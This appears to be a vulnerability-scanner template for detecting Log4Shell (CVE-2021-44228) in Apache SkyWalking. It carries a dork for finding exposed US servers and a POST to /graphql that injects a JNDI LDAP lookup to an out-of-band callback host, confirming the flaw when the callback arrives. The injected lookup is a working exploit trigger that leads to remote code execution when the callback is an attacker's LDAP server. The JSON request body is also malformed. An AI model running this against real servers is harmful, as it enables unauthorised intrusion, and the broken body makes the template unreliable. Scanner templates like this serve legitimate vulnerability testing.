name: Apache_Skywalking_log4j2_RCE__CVE_2021_44228
transport: http
detail:
  dock: title="SkyWalking" && body="SkyWalking"&& country="US"
  product: Apache Skywalking
  homepage: https://github.com/apache/skywalking
  impact: <p>A log4j2 vulnerability (CVE-2021-44228) exists in the Apache SkyWalking
    performance monitoring system, which allows attackers to remotely execute code
    and control server permissions.</p>
  description: <p>Apache SkyWalking is an application performance monitor mainly used
    by the Apache Software Foundation for microservices, cloud native and container-based
    environments.</p><p>A log4j2 vulnerability (CVE-2021-44228) exists in the Apache
    SkyWalking performance monitoring system, which allows attackers to remotely execute
    code and control server permissions.</p>
set:
  reverse: newReverse()
  payload: '${jndi:ldap://' + reverse.domain + '}'
rules: 
  r1:
    method: "POST"
    url: "/graphql"
    headers:
      Content-Type: application/json;charset=UTF-8
    body: 'query":"query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
 {{payload}}
      serviceName
      isError
      content
    }
  }
}
",
    "variables":{
        "condition":{
            "metricName":"test",
            "state":"ALL",
            "paging":{
                "pageSize":10
            }
        }
    }
}'
    expression: reverse.wait(5)
expression: r1()
